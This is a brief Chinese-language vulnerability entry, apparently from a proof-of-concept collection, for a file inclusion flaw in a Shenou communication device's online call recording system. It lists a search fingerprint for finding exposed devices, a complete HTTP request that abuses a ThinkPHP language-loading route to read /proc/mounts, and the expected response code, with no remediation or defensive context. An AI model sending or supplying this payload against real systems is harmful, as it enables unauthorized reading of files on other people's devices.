# 申瓯通信设备index存在文件包含漏洞

申瓯通信设备 ｜ 文件包含 ｜ —
- **指纹**：`title="在线录音管理系统"`
- **请求**：`GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1`
- **响应特征**：500